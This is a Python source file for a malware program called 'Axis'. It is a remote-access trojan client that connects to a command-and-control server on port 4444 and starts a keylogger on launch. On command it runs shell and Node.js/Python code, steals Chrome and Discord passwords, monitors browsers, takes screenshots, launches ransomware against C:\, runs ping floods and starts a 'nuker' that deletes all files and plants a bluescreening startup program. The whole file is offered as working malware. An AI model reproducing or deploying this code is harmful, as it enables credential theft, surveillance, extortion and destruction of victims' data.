import socket

import axis_execute_terminal_commands
import axis_remote_code_execution
import axis_password_grabber
import axis_browser_monitor
import axis_screenshotter
import axis_ransomware
import axis_keylogger
import axis_webinject
import axis_nuker
import axis_ping

CNC_IP = 'localhost'
CNC_PORT = 4444

"""
    This is the main file for the Axis malware.

    Open socket that can recieve information.

    Features:

    Web inject - Injects javascript into the web page inside the Browser. - Not Implemented, highly experimental.
    Ransomware - Implemented, need to send key to server instead of writing to file
    Remote code execution in: Node.js & Python - Implemented
    Keylogger - Implemented, appends to file.
    Screenshot (timed, or when asked) - Implemented screenshot function, returns base64 decoded string.
    Execute terminal commands - Implemented
    Password grabber (Google Chrome, Discord, etc.) - Implemented
    Browser monitor (Google Chrome, Firefox, Safari, etc.) - Implemented for Chrome
    Ping URL - Implemented
    Nuker (Delete all files from all drives, Append a startup program that bluescreens the computer when it starts) - Implemented

    This file will set up a connection and listen for commands from the command and control server.
"""

class Axis:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((CNC_IP, CNC_PORT))
        except:
            print('Could not connect to CNC server')

        self.execute_terminal_commands = axis_execute_terminal_commands.TerminalCommands
        self.remote_code_execution = axis_remote_code_execution.RemoteCodeExecution
        self.password_grabber = axis_password_grabber.PasswordGrabber
        self.browser_monitor = axis_browser_monitor.BrowserMonitor
        self.screenshot = axis_screenshotter.Screenshotter
        self.ransomware = axis_ransomware.Ransomware
        self.keylogger = axis_keylogger.Keylogger
        self.webinject = axis_webinject.Webinject
        self.nuker = axis_nuker.Nuker
        self.ping = axis_ping.Ping

        self.keylogger_instance = self.keylogger()
        self.keylogger_instance.start()

        self.listen()

    def send(self, data):
        self.sock.send(data.encode('utf-8'))

    def listen(self):
        while True:
            data = self.sock.recv(2048).decode('utf-8')
            if data:
                command = data[0]
                payload = data[1]
                if command == 'execute_terminal_commands':
                    result = self.execute_terminal_commands().start(payload)

                    message = ''

                    if result is None:
                        message = f'Error executing command: {payload}'
                    else:
                        message = result

                    self.send(f'[RESULT-0]{message}')
                elif command == 'remote_code_execution':
                    code = payload[0]
                    language = payload[1]

                    result = self.remote_code_execution().start(code, language)

                    message = ''

                    if result is None:
                        message = f'Invalid language: {language}'
                    else:
                        message = result
                    
                    self.send(f'[RESULT-1]{message}')
                elif command == 'password_grabber':
                    result = self.password_grabber().start()

                    chrome_passwords = result[0]
                    discord_passwords = result[1]

                    message = f'Chrome passwords: {chrome_passwords}\nDiscord passwords: {discord_passwords}'

                    self.send(f'[RESULT-2]{message}')
                elif command == 'browser_monitor':
                    message = self.browser_monitor().start()

                    self.send(f'[RESULT-3]{message}')
                elif command == 'screenshot':
                    message = self.screenshot().start()

                    self.send(f'[RESULT-4]{message}')
                elif command == 'ransomware':
                    message = self.ransomware(payload[0], payload[1], payload[2], payload[3], 'C:\\').start()

                    self.send(f'[RESULT-5]{message}')
                elif command == 'keylogger':
                    message = self.keylogger_instance.get_log()

                    self.send(f'[RESULT-6]{message}')
                elif command == 'webinject':
                    self.send('[RESULT-7]Not Implemented')
                elif command == 'nuker':
                    self.send('[RESULT-8]Nuked')
                    self.nuker.start()
                elif command == 'ping':
                    self.ping().start(payload[0], payload[1], payload[2], payload[3], False)

                    self.send(f'[RESULT-9]Pinged {payload[0]} {payload[1] * payload[3]} times over {payload[2] * payload[1]} seconds')
                else:
                    print('Unknown command: ' + command)
                    self.send('Unknown command: ' + command)

if __name__ == '__main__':
    Axis()